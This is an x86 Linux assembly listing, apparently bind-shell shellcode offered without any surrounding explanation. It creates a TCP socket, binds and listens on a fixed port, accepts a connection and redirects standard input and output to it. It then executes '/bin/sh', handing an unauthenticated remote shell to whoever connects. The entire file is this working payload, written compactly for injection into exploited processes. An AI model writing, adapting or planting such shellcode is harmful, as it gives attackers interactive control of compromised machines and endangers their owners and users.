;SYS_SOCKET        1
;SYS_BIND          2
;SYS_CONNECT       3
;SYS_LISTEN        4
;SYS_ACCEPT        5
global _start
section .text
_start:
    xor ebx,ebx
    mul ebx
    ;socket(2,1,0);
    ;{
    push ebx
    push 0x1
    push 0x2
    mov ecx, esp
    inc ebx
    mov al, 0x66
    int 0x80
    ;}
    ; save socket FD in edx; and eax has 0
    xchg edx, eax

    ;srv.sin_family=2;srv.sin_port = htons(0xD304);srv.sin_addr.s_addr=0;
    ;sockaddr struct
    ;{

    push eax
    push word 0xD304
    push word 0x2
  
    mov ecx, esp
    ;}
    ;bind(sock,(struct sockaddr*)&srv,16);
    ;{
    push 0x10
    push ecx
    push edx
    mov ecx, esp
    ;pop ebx already popped
    inc ebx
    mov al,0x66
    int 0x80
    ;}

    ;listen(sock,0);
    ;{
    push eax
    push edx
    mov ecx, esp
    mov bl, 0x4
    mov al,0x66
    int 0x80
    ;}
    ;accept(sock,NULL,NULL);
    ;{
    push eax
    push eax
    push edx
    mov ecx, esp
    inc ebx
    mov al,0x66
    int 0x80
    ;}
    ; save returned socket FD in ebx
    xchg ebx,eax ;now eax contains 5
    mov dl, 0x2
    dup2loop:
    mov ecx, edx
    mov al, 0x3f
    int 0x80
    dec edx
    jns dup2loop

    inc edx
    push ecx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    mov al, 0x0b
    int 0x80